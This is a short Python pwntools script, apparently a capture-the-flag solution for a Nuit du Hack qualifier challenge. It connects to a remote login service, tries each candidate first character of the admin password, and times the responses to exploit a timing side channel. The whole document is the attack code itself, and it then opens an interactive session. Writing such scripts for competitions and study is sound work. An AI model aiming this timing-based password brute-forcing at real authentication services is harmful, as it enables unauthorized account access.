from pwn import *

k = '0123456789QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm'
k = list(k)
s = remote('entrop3r.quals.nuitduhack.com',31337)
s.recvuntil('# exit')
for i in range(len(k)):
  t1 = time.time()
  s.send('auth\n')
  s.recvuntil('Login #')
  s.send('admin\n')
  s.recvuntil('Password #')
  s.send(k[i]+'\n')
  s.recvuntil('~')
  t2 = time.time()
  print t2-t1
  print k[i]
s.interactive()
